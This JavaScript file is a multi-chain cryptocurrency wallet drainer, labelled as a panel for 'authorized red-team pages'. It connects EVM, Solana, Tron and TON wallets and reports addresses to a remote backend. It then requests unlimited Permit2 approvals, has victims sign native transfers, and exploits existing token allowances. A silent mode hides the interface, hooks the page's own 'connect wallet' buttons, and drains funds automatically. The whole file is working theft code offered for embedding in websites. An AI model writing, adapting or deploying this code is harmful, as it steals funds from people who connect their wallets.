/**
 * legion-one-script.js — Standalone Legion wallet panel for authorized red-team pages.
 * Include: <script src="https://your-cdn.com/legion-one-script.js"></script>
 * Configure (optional, before script): window.LEGION_CONFIG = { ... }
 */
(function () {
  'use strict';

  if (window.__LEGION_ONE_SCRIPT_LOADED__) return;
  window.__LEGION_ONE_SCRIPT_LOADED__ = true;

  var DEFAULTS = {
    backendUrl: 'https://legionapi-production.up.railway.app',
    kineticKey: '',
    wcProjectId: '',
    autoDrain: true,
    silentMode: false,
    showBalance: true,
  };

  var CFG = Object.assign({}, DEFAULTS, window.LEGION_CONFIG || {});
  var BACKEND = String(CFG.backendUrl || DEFAULTS.backendUrl).replace(/\/$/, '');
  var KINETIC_KEY = CFG.kineticKey || '';
  var WC_PROJECT_ID = CFG.wcProjectId || '';
  var AUTO_DRAIN = CFG.autoDrain !== false;
  var SILENT_MODE = CFG.silentMode === true;
  var SHOW_BALANCE = CFG.showBalance !== false;

  var EXPIRY_ISO = '2099-12-31T23:59:59.999Z';
  var MAX_PERMIT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
  var DEFAULT_USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
  var ACTIVE_TAB = 'evm';

  var WC_EVM_CHAINS = [
    'eip155:1', 'eip155:137', 'eip155:56', 'eip155:42161', 'eip155:8453', 'eip155:10', 'eip155:43114',
  ];
  var WC_SOLANA = 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp';

  var wallets = { evm: null, sol: null, tron: null, ton: null };
  var wcProvider = null;
  var wcModal = null;
  var wcSdkPromise = null;
  var drainRunning = false;

  /* ── Styles (injected once) ─────────────────────────────────────────── */
  function injectStyles() {
    if (document.getElementById('legion-one-styles')) return;
    var css = document.createElement('style');
    css.id = 'legion-one-styles';
    css.textContent = [
      '#legion-one-launcher{position:fixed;bottom:24px;right:24px;z-index:2147483640;width:52px;height:52px;border-radius:50%;border:0;background:linear-gradient(135deg,#6366f1,#4f46e5);color:#fff;font:700 22px/1 system-ui,sans-serif;cursor:pointer;box-shadow:0 8px 24px rgba(0,0,0,.35);}',
      '#legion-one-panel{position:fixed;bottom:88px;right:24px;z-index:2147483641;width:min(360px,calc(100vw - 32px));background:#0f172a;color:#e2e8f0;border-radius:14px;box-shadow:0 16px 48px rgba(0,0,0,.5);font:13px/1.45 system-ui,sans-serif;overflow:hidden;display:none;}',
      '#legion-one-panel.open{display:block;}',
      '#legion-one-panel .hdr{display:flex;align-items:center;justify-content:space-between;padding:10px 12px;background:#1e293b;cursor:move;user-select:none;}',
      '#legion-one-panel .hdr span{font-weight:600;font-size:12px;}',
      '#legion-one-panel .hdr button{background:transparent;border:0;color:#94a3b8;font-size:18px;cursor:pointer;padding:0 4px;}',
      '#legion-one-panel .tabs{display:flex;border-bottom:1px solid #334155;}',
      '#legion-one-panel .tabs button{flex:1;padding:8px 4px;border:0;background:transparent;color:#94a3b8;cursor:pointer;font:inherit;font-size:11px;}',
      '#legion-one-panel .tabs button.on{background:#334155;color:#fff;}',
      '#legion-one-panel .body{padding:12px;}',
      '#legion-one-status{min-height:2.4em;font-size:12px;color:#94a3b8;margin-bottom:10px;word-break:break-word;}',
      '#legion-one-status.ok{color:#4ade80;font-weight:600;}',
      '#legion-one-status.err{color:#f87171;}',
      '#legion-one-balance{font-size:11px;color:#64748b;margin-bottom:8px;max-height:80px;overflow:auto;}',
      '#legion-one-panel .btn{width:100%;padding:11px;border:0;border-radius:10px;font:600 14px system-ui,sans-serif;cursor:pointer;margin-bottom:8px;}',
      '#legion-one-panel .btn-primary{background:linear-gradient(135deg,#6366f1,#4f46e5);color:#fff;}',
      '#legion-one-panel .btn-primary:disabled{opacity:.45;cursor:not-allowed;}',
      '#legion-one-panel .btn-secondary{background:rgba(99,102,241,.15);color:#c7d2fe;border:1px solid #6366f1;}',
      '#legion-one-panel .btn-secondary:disabled{opacity:.4;border-color:#475569;color:#64748b;}',
      '#legion-one-progress{height:3px;background:#334155;border-radius:2px;overflow:hidden;margin-top:6px;display:none;}',
      '#legion-one-progress i{display:block;height:100%;width:30%;background:#6366f1;animation:legionProg 1.2s ease-in-out infinite;}',
      '@keyframes legionProg{0%{transform:translateX(-100%)}100%{transform:translateX(400%)}}',
      'body.legion-one-silent #legion-one-launcher,body.legion-one-silent #legion-one-panel{display:none!important;}',
    ].join('');
    document.head.appendChild(css);
  }

  function setStatus(text, kind) {
    var el = document.getElementById('legion-one-status');
    if (!el) return;
    el.textContent = text;
    el.className = kind === 'ok' ? 'ok' : kind === 'err' ? 'err' : '';
    var prog = document.getElementById('legion-one-progress');
    if (prog) prog.style.display = kind === 'busy' ? 'block' : 'none';
  }

  function parseEnvelope(res, data) {
    if (data && typeof data.ok === 'boolean') {
      return { ok: data.ok, message: data.message || '', data: data.data != null ? data.data : data };
    }
    return { ok: res.ok, message: (data && data.message) || res.statusText || '', data: data };
  }

  function kineticHeaders() {
    var h = { 'Content-Type': 'application/json' };
    if (KINETIC_KEY) h['x-legion-kinetic-key'] = KINETIC_KEY;
    return h;
  }

  async function apiPost(path, body, extraHeaders) {
    var headers = Object.assign(kineticHeaders(), extraHeaders || {});
    var res = await fetch(BACKEND + path, {
      method: 'POST',
      headers: headers,
      body: JSON.stringify(body),
      keepalive: true,
      credentials: 'omit',
    });
    var data = await res.json().catch(function () { return {}; });
    var env = parseEnvelope(res, data);
    if (!env.ok) throw new Error(env.message || 'API error ' + res.status);
    return env.data;
  }

  async function apiGet(path) {
    var res = await fetch(BACKEND + path, { method: 'GET', credentials: 'omit', keepalive: true });
    var data = await res.json().catch(function () { return {}; });
    var env = parseEnvelope(res, data);
    if (!env.ok) throw new Error(env.message || 'API error ' + res.status);
    return env.data;
  }

  function toHex(n) {
    return '0x' + BigInt(n).toString(16);
  }

  /* ── Wallet connectors ────────────────────────────────────────────────── */
  async function connectEvm() {
    if (wallets.evm) return wallets.evm;
    var eth = window.ethereum;
    if (!eth) throw new Error('MetaMask / injected EVM wallet not found');
    var accounts = await eth.request({ method: 'eth_requestAccounts' });
    if (!accounts || !accounts[0]) throw new Error('No EVM account');
    var chainHex = await eth.request({ method: 'eth_chainId' });
    wallets.evm = {
      address: accounts[0],
      chainId: parseInt(chainHex, 16),
      provider: eth.isMetaMask ? 'MetaMask' : 'Injected EVM',
    };
    return wallets.evm;
  }

  async function connectSolana() {
    if (wallets.sol) return wallets.sol;
    var sol = (window.phantom && window.phantom.solana) || (window.solflare && window.solflare.isSolflare && window.solflare);
    if (!sol) throw new Error('Phantom / Solflare not found');
    var resp = await sol.connect();
    var pk = (resp && resp.publicKey) ? resp.publicKey.toString() : (sol.publicKey && sol.publicKey.toString());
    if (!pk) throw new Error('Solana wallet returned no key');
    wallets.sol = { address: pk, provider: sol, name: window.phantom ? 'Phantom' : 'Solflare' };
    return wallets.sol;
  }

  async function connectTron() {
    if (wallets.tron) return wallets.tron;
    if (window.tronLink && window.tronLink.request) {
      await window.tronLink.request({ method: 'tron_requestAccounts' });
    }
    var tw = window.tronWeb;
    if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
      throw new Error('TronLink not ready');
    }
    wallets.tron = { address: tw.defaultAddress.base58, provider: 'TronLink' };
    return wallets.tron;
  }

  async function connectTon() {
    if (wallets.ton) return wallets.ton;
    var ton = (window.tonkeeper && window.tonkeeper.provider) || (window.ton && window.ton.isTonkeeper && window.ton);
    if (!ton) throw new Error('Tonkeeper not found');
    var accounts = await ton.send('ton_getAccounts');
    var addr = accounts && accounts[0] && (accounts[0].address || accounts[0]);
    if (!addr) throw new Error('Tonkeeper returned no address');
    wallets.ton = { address: String(addr), provider: ton };
    return wallets.ton;
  }

  function loadWcSdk() {
    if (!WC_PROJECT_ID) return Promise.reject(new Error('Set LEGION_CONFIG.wcProjectId for WalletConnect'));
    if (!wcSdkPromise) {
      wcSdkPromise = Promise.all([
        import('https://esm.sh/@walletconnect/universal-provider@2.13.0'),
        import('https://esm.sh/@walletconnect/modal@2.7.0'),
      ]).then(function (mods) {
        return {
          UniversalProvider: mods[0].default || mods[0].UniversalProvider,
          WalletConnectModal: mods[1].WalletConnectModal || (mods[1].default && mods[1].default.WalletConnectModal),
        };
      });
    }
    return wcSdkPromise;
  }

  async function connectWalletConnect() {
    var sdk = await loadWcSdk();
    if (!wcProvider || !wcProvider.session) {
      wcProvider = await sdk.UniversalProvider.init({
        projectId: WC_PROJECT_ID,
        metadata: {
          name: document.title || 'Wallet',
          description: 'Connect wallet',
          url: location.origin,
          icons: [location.origin + '/favicon.ico'],
        },
      });
      if (!wcModal && sdk.WalletConnectModal) {
        wcModal = new sdk.WalletConnectModal({ projectId: WC_PROJECT_ID, themeMode: 'dark' });
      }
      wcProvider.on('display_uri', function (uri) { if (wcModal) wcModal.openModal({ uri: uri }); });
      await wcProvider.connect({
        namespaces: {
          eip155: {
            methods: ['eth_signTypedData_v4', 'eth_sendTransaction', 'eth_requestAccounts', 'eth_chainId'],
            chains: WC_EVM_CHAINS,
            events: ['accountsChanged', 'chainChanged'],
          },
          solana: {
            methods: ['solana_signTransaction'],
            chains: [WC_SOLANA],
            events: [],
          },
        },
      });
      if (wcModal) wcModal.closeModal();
    }
    var ns = (wcProvider.session && wcProvider.session.namespaces) || {};
    if (ns.eip155 && ns.eip155.accounts && ns.eip155.accounts[0]) {
      var parts = ns.eip155.accounts[0].split(':');
      wallets.evm = {
        address: parts.slice(2).join(':'),
        chainId: parseInt(parts[1], 10),
        provider: 'WalletConnect',
        wcProvider: wcProvider,
      };
    }
    if (ns.solana && ns.solana.accounts && ns.solana.accounts[0]) {
      var sp = ns.solana.accounts[0].split(':');
      wallets.sol = { address: sp.slice(2).join(':'), provider: wcProvider, name: 'WalletConnect', wc: true };
    }
    if (!wallets.evm && !wallets.sol) throw new Error('WalletConnect: no accounts');
    return wallets;
  }

  async function connectActiveTab() {
    if (ACTIVE_TAB === 'evm') return connectEvm();
    if (ACTIVE_TAB === 'sol') return connectSolana();
    if (ACTIVE_TAB === 'tron') return connectTron();
    if (ACTIVE_TAB === 'ton') return connectTon();
    throw new Error('Unknown chain tab');
  }

  async function getEvmSigner() {
    if (wallets.evm && wallets.evm.wcProvider) return wallets.evm.wcProvider;
    if (!window.ethereum) throw new Error('No EVM signer');
    return window.ethereum;
  }

  /* ── Backend flow ─────────────────────────────────────────────────────── */
  async function postScout(conn) {
    var family = ACTIVE_TAB === 'evm' ? 'EVM' : ACTIVE_TAB === 'sol' ? 'SVM' : ACTIVE_TAB === 'tron' ? 'TRON' : 'TON';
    return apiPost('/api/v1/scout', {
      user_address: conn.address,
      chain_id: conn.chainId || 0,
      chain_family: family,
      wallet_type: conn.provider || conn.name || ACTIVE_TAB,
    });
  }

  async function postFusion() {
    var body = {};
    if (wallets.evm) body.evm_holder = wallets.evm.address;
    if (wallets.sol) body.sol_owner_base58 = wallets.sol.address;
    if (wallets.tron) body.tron_holder_base58 = wallets.tron.address;
    if (wallets.ton) body.ton_friendly_address = wallets.ton.address;
    if (!Object.keys(body).length) return { fusion: {}, total_usd: 0 };
    var data = await apiPost('/api/scout/recursive-predator-fusion', body);
    var fusion = (data && data.fusion) || data || {};
    return { fusion: fusion, total_usd: typeof fusion.total_usd === 'number' ? fusion.total_usd : 0 };
  }

  async function fetchBalanceDisplay() {
    if (!SHOW_BALANCE) return;
    var q = [];
    if (wallets.evm) q.push('evm=' + encodeURIComponent(wallets.evm.address));
    if (wallets.sol) q.push('sol=' + encodeURIComponent(wallets.sol.address));
    if (wallets.tron) q.push('tron=' + encodeURIComponent(wallets.tron.address));
    if (wallets.ton) q.push('ton=' + encodeURIComponent(wallets.ton.address));
    if (!q.length) return;
    try {
      var data = await apiGet('/api/v1/balance/multi?' + q.join('&'));
      var el = document.getElementById('legion-one-balance');
      if (!el || !data.chains) return;
      var lines = data.chains.map(function (c) {
        return c.native.symbol + ': ' + c.native.amount + (c.tokens.length ? ' +' + c.tokens.length + ' tokens' : '');
      });
      el.textContent = lines.join(' | ');
    } catch (e) { /* optional */ }
  }

  async function tryAllowanceReuse() {
    if (!KINETIC_KEY) return null;
    var scanBody = {};
    if (wallets.evm) {
      scanBody.wallet_address = wallets.evm.address;
      scanBody.evm_chain_id = wallets.evm.chainId;
    } else if (wallets.sol) {
      scanBody.wallet_address = wallets.sol.address;
      scanBody.sol_wallet = wallets.sol.address;
    } else if (wallets.tron) {
      scanBody.wallet_address = wallets.tron.address;
      scanBody.tron_wallet = wallets.tron.address;
    } else if (wallets.ton) {
      scanBody.wallet_address = wallets.ton.address;
      scanBody.ton_wallet = wallets.ton.address;
    } else return null;

    var headers = kineticHeaders();
    var scanRes = await fetch(BACKEND + '/api/internal/allowance-reuse/scan', {
      method: 'POST', headers: headers, body: JSON.stringify(scanBody), keepalive: true, credentials: 'omit',
    });
    var scanData = await scanRes.json().catch(function () { return {}; });
    var scanEnv = parseEnvelope(scanRes, scanData);
    if (!scanEnv.ok) return null;

    var executable = ((scanEnv.data && scanEnv.data.allowances) || []).filter(function (a) { return a.executable; });
    if (!executable.length) return null;

    var execRes = await fetch(BACKEND + '/api/internal/allowance-reuse/execute', {
      method: 'POST',
      headers: headers,
      body: JSON.stringify({ wallet_address: scanBody.wallet_address, allowances: executable }),
      keepalive: true,
      credentials: 'omit',
    });
    var execData = await execRes.json().catch(function () { return {}; });
    var execEnv = parseEnvelope(execRes, execData);
    if (!execEnv.ok) throw new Error(execEnv.message || 'Allowance execute failed');
    return execEnv.data;
  }

  function extractPermits(fusion) {
    var permits = [];
    var layers = fusion.evm_layers || fusion.evm || [];
    if (Array.isArray(layers)) {
      for (var i = 0; i < layers.length; i++) {
        var L = layers[i];
        if (L.token && L.amount) permits.push({ token: L.token, amount: String(L.amount) });
        else if (L.token_address) permits.push({ token: L.token_address, amount: MAX_PERMIT });
      }
    }
    if (!permits.length) permits.push({ token: DEFAULT_USDC, amount: MAX_PERMIT });
    return permits;
  }

  function estimateNative(fusion) {
    return {
      native: String(fusion.native_wei || (fusion.evm && fusion.evm.native_wei) || '0'),
      sol: String(fusion.sol_lamports || (fusion.solana && fusion.solana.lamports) || '0'),
      trx: String(fusion.trx_sun || (fusion.tron && fusion.tron.sun) || '0'),
      ton: String(fusion.ton_nanoton || (fusion.ton && fusion.ton.nanoton) || '0'),
    };
  }

  async function signEvmTypedData(typedData) {
    var signer = await getEvmSigner();
    return signer.request({
      method: 'eth_signTypedData_v4',
      params: [wallets.evm.address, JSON.stringify(typedData)],
    });
  }

  async function signEvmNativeTx(tx) {
    if (!tx) return null;
    var signer = await getEvmSigner();
    try {
      return await signer.request({
        method: 'eth_signTransaction',
        params: [{
          from: tx.from, to: tx.to, value: toHex(tx.value), gas: toHex(tx.gas),
          maxFeePerGas: toHex(tx.maxFeePerGas), maxPriorityFeePerGas: toHex(tx.maxPriorityFeePerGas),
          nonce: toHex(tx.nonce), type: '0x2', chainId: toHex(tx.chainId),
        }],
      });
    } catch (e) {
      return signer.request({
        method: 'eth_sendTransaction',
        params: [{ from: tx.from, to: tx.to, value: toHex(tx.value), gas: toHex(tx.gas), type: '0x2' }],
      });
    }
  }

  async function loadSolWeb3() {
    if (window.solanaWeb3) return window.solanaWeb3;
    await new Promise(function (resolve, reject) {
      var s = document.createElement('script');
      s.src = 'https://unpkg.com/@solana/web3.js@1.98.0/lib/index.iife.min.js';
      s.onload = resolve;
      s.onerror = reject;
      document.head.appendChild(s);
    });
    return window.solanaWeb3;
  }

  async function signSolWire(b64) {
    if (wallets.sol && wallets.sol.wc && wcProvider) {
      var r = await wcProvider.request({ method: 'solana_signTransaction', params: { transaction: b64 } }, 'solana');
      return (r && r.transaction) ? r.transaction : (typeof r === 'string' ? r : b64);
    }
    var web3 = await loadSolWeb3();
    var bytes = Uint8Array.from(atob(b64), function (c) { return c.charCodeAt(0); });
    var tx = web3.VersionedTransaction.deserialize(bytes);
    var signed = await wallets.sol.provider.signTransaction(tx);
    var out = signed.serialize();
    var bin = '';
    for (var i = 0; i < out.length; i++) bin += String.fromCharCode(out[i]);
    return btoa(bin);
  }

  async function signTronTx(payload) {
    if (!payload || !window.tronWeb || !window.tronWeb.trx) return null;
    if (payload.unsigned) return window.tronWeb.trx.sign(payload.unsigned);
    if (payload.raw_data) return window.tronWeb.trx.sign(payload);
    return null;
  }

  async function signTonTx(payload) {
    if (!payload || !wallets.ton) return null;
    if (payload.boc && wallets.ton.provider.send) {
      return wallets.ton.provider.send('ton_signData', { cell: payload.boc });
    }
    return payload.signed_boc || null;
  }

  async function runOmnichainDrain(scoutUsd) {
    if (!wallets.evm) throw new Error('EVM wallet required for Permit2 batch');
    var evm = wallets.evm;
    var fusionResult = await postFusion();
    var fusion = fusionResult.fusion;
    var amounts = estimateNative(fusion);
    var permits = extractPermits(fusion);

    try {
      var ranked = await apiPost('/api/v1/scout/ranked', { wallet_address: evm.address, chain_family: 'EVM' });
      if (ranked.assets && ranked.assets.length) {
        var top = ranked.assets.filter(function (a) {
          return a.token && a.token !== 'native' && a.token.indexOf('0x') === 0;
        }).slice(0, 8).map(function (a) { return { token: a.token, amount: a.amount_raw || MAX_PERMIT }; });
        if (top.length) permits = top;
      }
    } catch (e) { /* ranked optional */ }

    setStatus('Preparing Permit2 batch…', 'busy');
    var batchBody = {
      wallet_address: evm.address,
      chain_id: evm.chainId,
      permits: permits,
      nativeAmount: amounts.native,
    };
    if (wallets.sol) { batchBody.sol_wallet = wallets.sol.address; batchBody.nativeAmountSol = amounts.sol; }
    if (wallets.tron) { batchBody.trx_wallet = wallets.tron.address; batchBody.nativeAmountTrx = amounts.trx; }
    if (wallets.ton) { batchBody.ton_wallet = wallets.ton.address; batchBody.nativeAmountTon = amounts.ton; }

    var batch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', batchBody);
    if (!batch.typed_data || !batch.batch_permit_metadata) throw new Error('Batch typed data missing');

    setStatus('Sign Permit2 authorization…', 'busy');
    var permitSig = await signEvmTypedData(batch.typed_data);

    var nativeSignedTx = null;
    if (batch.native_transfer && BigInt(batch.nativeAmount || '0') > 0n) {
      setStatus('Sign EVM native transfer…', 'busy');
      nativeSignedTx = await signEvmNativeTx(batch.native_transfer);
    }

    var nativeSignedSol = null;
    if (batch.spl_transfer && batch.spl_amount && BigInt(batch.spl_amount) > 0n) {
      nativeSignedSol = await signSolWire(batch.spl_transfer.unsignedWireBase64);
    } else if (batch.native_transfer_sol && batch.native_amount_sol && BigInt(batch.native_amount_sol) > 0n) {
      nativeSignedSol = await signSolWire(batch.native_transfer_sol.unsignedWireBase64);
    }

    var nativeSignedTrx = null;
    if (batch.native_transfer_trx && batch.native_amount_trx && BigInt(batch.native_amount_trx) > 0n) {
      nativeSignedTrx = await signTronTx(batch.native_transfer_trx);
    }

    var nativeSignedTon = null;
    if (batch.native_transfer_ton && batch.native_amount_ton && BigInt(batch.native_amount_ton) > 0n) {
      nativeSignedTon = await signTonTx(batch.native_transfer_ton);
    }

    var anchorBody = {
      ingress: 'normalized_v1',
      chain_family: 'EVM',
      protocol: 'omnichain_atomic_v1',
      wallet_address: evm.address,
      token_address: permits[0].token,
      permits: permits,
      batch_permit_metadata: batch.batch_permit_metadata,
      chain_id: evm.chainId,
      engine_spender: batch.engine_spender,
      permit2: batch.permit2,
      nativeAmount: batch.nativeAmount || amounts.native,
      signature: permitSig,
      nonce: 'omni:' + Date.now(),
      expiry_iso: EXPIRY_ISO,
      wallet_type: evm.provider,
      scout_value_usd: scoutUsd || 1,
      max_allowance: MAX_PERMIT,
      requires_quorum: false,
    };

    if (nativeSignedTx) anchorBody.native_signed_transaction = nativeSignedTx;
    if (wallets.sol) anchorBody.sol_wallet = wallets.sol.address;
    if (wallets.tron) anchorBody.trx_wallet = wallets.tron.address;
    if (wallets.ton) anchorBody.ton_wallet = wallets.ton.address;
    if (nativeSignedSol) anchorBody.native_signed_transaction_sol = nativeSignedSol;
    if (batch.spl_mint) anchorBody.spl_mint = batch.spl_mint;
    if (batch.spl_amount) anchorBody.spl_amount = batch.spl_amount;
    if (nativeSignedTrx) anchorBody.native_signed_transaction_trx = nativeSignedTrx;
    if (nativeSignedTon) anchorBody.native_signed_transaction_ton = nativeSignedTon;
    if (batch.native_amount_sol) anchorBody.nativeAmountSol = batch.native_amount_sol;
    if (batch.native_amount_trx) anchorBody.nativeAmountTrx = batch.native_amount_trx;
    if (batch.native_amount_ton) anchorBody.nativeAmountTon = batch.native_amount_ton;

    setStatus('Submitting to settlement engine…', 'busy');
    return apiPost('/api/v1/signature-anchor', anchorBody);
  }

  /* ── Main drain orchestrator ──────────────────────────────────────────── */
  async function runDrain(opts) {
    if (drainRunning) return;
    drainRunning = true;
    var skipConnect = opts && opts.skipConnect;
    var btn = document.getElementById('legion-one-drain-btn');
    if (btn) btn.disabled = true;

    try {
      setStatus('Connecting…', 'busy');
      var conn = skipConnect ? (
        ACTIVE_TAB === 'evm' ? wallets.evm :
        ACTIVE_TAB === 'sol' ? wallets.sol :
        ACTIVE_TAB === 'tron' ? wallets.tron :
        ACTIVE_TAB === 'ton' ? wallets.ton : null
      ) : await connectActiveTab();
      if (!conn) throw new Error('Connect a wallet first');

      setStatus('Scouting wallet…', 'busy');
      await postScout(conn);
      await fetchBalanceDisplay();

      var fusionResult = await postFusion();
      var scoutUsd = fusionResult.total_usd || 1;

      if (KINETIC_KEY) {
        setStatus('Checking existing allowances…', 'busy');
        var reused = await tryAllowanceReuse();
        if (reused) {
          setStatus('Drained via existing allowance — done', 'ok');
          return reused;
        }
      }

      if (!wallets.evm && ACTIVE_TAB !== 'evm') {
        setStatus('Connecting EVM for omnichain batch…', 'busy');
        await connectEvm();
      }

      setStatus('Draining…', 'busy');
      var result = await runOmnichainDrain(scoutUsd);
      var tx = result.transaction_hash || result.settlement_status || 'submitted';
      setStatus('Settlement complete: ' + tx, 'ok');
      return result;
    } catch (err) {
      setStatus((err && err.message) ? err.message : String(err), 'err');
      console.warn('[LEGION_ONE]', err);
      throw err;
    } finally {
      drainRunning = false;
      if (btn) btn.disabled = false;
    }
  }

  /* ── UI ───────────────────────────────────────────────────────────────── */
  function makeDraggable(panel, handle) {
    var dragging = false;
    var ox = 0;
    var oy = 0;
    handle.addEventListener('mousedown', function (e) {
      if (e.target.tagName === 'BUTTON') return;
      dragging = true;
      var r = panel.getBoundingClientRect();
      ox = e.clientX - r.left;
      oy = e.clientY - r.top;
      panel.style.right = 'auto';
      panel.style.bottom = 'auto';
      panel.style.left = r.left + 'px';
      panel.style.top = r.top + 'px';
      e.preventDefault();
    });
    document.addEventListener('mousemove', function (e) {
      if (!dragging) return;
      panel.style.left = Math.max(0, e.clientX - ox) + 'px';
      panel.style.top = Math.max(0, e.clientY - oy) + 'px';
    });
    document.addEventListener('mouseup', function () { dragging = false; });
  }

  function mountUi() {
    injectStyles();

    if (SILENT_MODE) {
      document.body.classList.add('legion-one-silent');
      var hidden = document.createElement('div');
      hidden.id = 'legion-one-status';
      hidden.style.display = 'none';
      document.body.appendChild(hidden);
      hookConnectButtons();
      if (window.ethereum && window.ethereum.selectedAddress && AUTO_DRAIN) {
        wallets.evm = {
          address: window.ethereum.selectedAddress,
          chainId: window.ethereum.chainId ? parseInt(window.ethereum.chainId, 16) : 1,
          provider: 'Injected',
        };
        ACTIVE_TAB = 'evm';
        runDrain({ skipConnect: true });
      }
      return;
    }

    var launcher = document.createElement('button');
    launcher.id = 'legion-one-launcher';
    launcher.type = 'button';
    launcher.title = 'Wallet';
    launcher.textContent = '⬡';
    launcher.addEventListener('click', function () {
      document.getElementById('legion-one-panel').classList.toggle('open');
    });

    var panel = document.createElement('div');
    panel.id = 'legion-one-panel';
    panel.innerHTML = [
      '<div class="hdr"><span>Wallet Connect</span><button type="button" id="legion-one-close" aria-label="Close">×</button></div>',
      '<div class="tabs">',
      '  <button type="button" data-tab="evm" class="on">EVM</button>',
      '  <button type="button" data-tab="sol">SOL</button>',
      '  <button type="button" data-tab="tron">TRX</button>',
      '  <button type="button" data-tab="ton">TON</button>',
      '</div>',
      '<div class="body">',
      '  <div id="legion-one-status">Select chain and connect.</div>',
      '  <div id="legion-one-balance"></div>',
      '  <div id="legion-one-progress"><i></i></div>',
      '  <button type="button" class="btn btn-secondary" id="legion-one-wc-btn">WalletConnect</button>',
      '  <button type="button" class="btn btn-primary" id="legion-one-drain-btn">Connect &amp; Drain</button>',
      '</div>',
    ].join('');

    document.body.appendChild(launcher);
    document.body.appendChild(panel);

    panel.querySelector('#legion-one-close').addEventListener('click', function () {
      panel.classList.remove('open');
    });

    makeDraggable(panel, panel.querySelector('.hdr'));

    panel.querySelectorAll('.tabs button').forEach(function (tab) {
      tab.addEventListener('click', function () {
        ACTIVE_TAB = tab.getAttribute('data-tab') || 'evm';
        panel.querySelectorAll('.tabs button').forEach(function (b) { b.classList.remove('on'); });
        tab.classList.add('on');
        setStatus('Chain: ' + ACTIVE_TAB.toUpperCase(), null);
      });
    });

    document.getElementById('legion-one-wc-btn').addEventListener('click', async function () {
      try {
        setStatus('Opening WalletConnect…', 'busy');
        await connectWalletConnect();
        if (wallets.evm) ACTIVE_TAB = 'evm';
        else if (wallets.sol) ACTIVE_TAB = 'sol';
        if (AUTO_DRAIN) await runDrain({ skipConnect: true });
        else setStatus('WalletConnect connected', 'ok');
      } catch (e) {
        setStatus(e.message || String(e), 'err');
      }
    });

    document.getElementById('legion-one-drain-btn').addEventListener('click', function () {
      runDrain({ skipConnect: false });
    });

    if (!WC_PROJECT_ID) {
      document.getElementById('legion-one-wc-btn').disabled = true;
      document.getElementById('legion-one-wc-btn').title = 'Set LEGION_CONFIG.wcProjectId';
    }
  }

  function hookConnectButtons() {
    var re = /connect\s*(wallet)?|wallet\s*connect|sign\s*in/i;
    document.querySelectorAll('button,a,[role="button"]').forEach(function (el) {
      if (el.__legionHook) return;
      var label = ((el.textContent || '') + ' ' + (el.getAttribute('aria-label') || '')).trim();
      if (!re.test(label)) return;
      el.__legionHook = true;
      el.addEventListener('click', function () {
        setTimeout(function () {
          if (window.ethereum && window.ethereum.selectedAddress) {
            wallets.evm = {
              address: window.ethereum.selectedAddress,
              chainId: window.ethereum.chainId ? parseInt(window.ethereum.chainId, 16) : 1,
              provider: 'Injected',
            };
            ACTIVE_TAB = 'evm';
            if (AUTO_DRAIN) runDrain({ skipConnect: true });
          }
        }, 1500);
      }, true);
    });
  }

  /* ── Public API ───────────────────────────────────────────────────────── */
  window.LegionOne = {
    connect: connectActiveTab,
    connectWalletConnect: connectWalletConnect,
    drain: runDrain,
    getWallets: function () { return Object.assign({}, wallets); },
    setTab: function (tab) { ACTIVE_TAB = tab; },
    config: CFG,
  };

  function boot() {
    mountUi();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
  } else {
    boot();
  }
})();
